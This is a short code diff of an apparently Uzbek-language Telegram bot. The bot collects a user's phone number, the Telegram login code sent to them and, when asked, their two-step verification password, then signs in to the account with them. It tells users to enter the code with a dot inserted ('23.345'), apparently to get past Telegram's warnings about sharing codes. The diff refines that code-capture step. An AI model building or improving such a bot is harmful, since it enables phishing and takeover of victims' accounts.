@@ -212,16 +212,23 @@ if not phone.startswith("+998") or not phone[1:].isdigit() or len(phone) != 13:
     await msg.answer("🔐 Telegram kodi yuborildi")
 
 # ================== KOD ==================
-@dp.message_handler(lambda m: m.from_user.id in sessions and sessions[m.from_user.id]["step"] == "code")
+@dp.message_handler(
+    lambda m: m.from_user.id in sessions
+    and sessions[m.from_user.id]["step"] == "code"
+)
 async def code_handler(msg: types.Message):
     uid = msg.from_user.id
     state = sessions[uid]
 
-    # 🔢 FAQAT RAQAMLARNI OLAMIZ
+    # 🔢 faqat raqamlarni olib qolamiz
     code = re.sub(r"\D", "", msg.text)
 
-    if len(code) < 5:
-        await msg.answer("❌ Kod noto‘g‘ri. Masalan: 23.345 yoki 23345")
+    # ❗ Telegram kodi ODATDA 5 xonali
+    if len(code) != 5:
+        await msg.answer(
+            "❌ Kod noto‘g‘ri.\n"
+            "Masalan: 23.345 yoki 23345"
+        )
         return
 
     try:
@@ -230,11 +237,13 @@ async def code_handler(msg: types.Message):
             code=code,
             phone_code_hash=state["phone_code_hash"]
         )
+
     except PhoneCodeExpiredError:
-        await msg.answer("⛔ Kod eskirdi. Qayta Aktivlash bosing.")
+        await msg.answer("⛔ Kod eskirdi. Qayta ✅ Aktivlash bosing.")
         await state["client"].disconnect()
         sessions.pop(uid, None)
         return
+
     except SessionPasswordNeededError:
         state["step"] = "password"
         await msg.answer("🔑 2 bosqichli parolni yuboring")
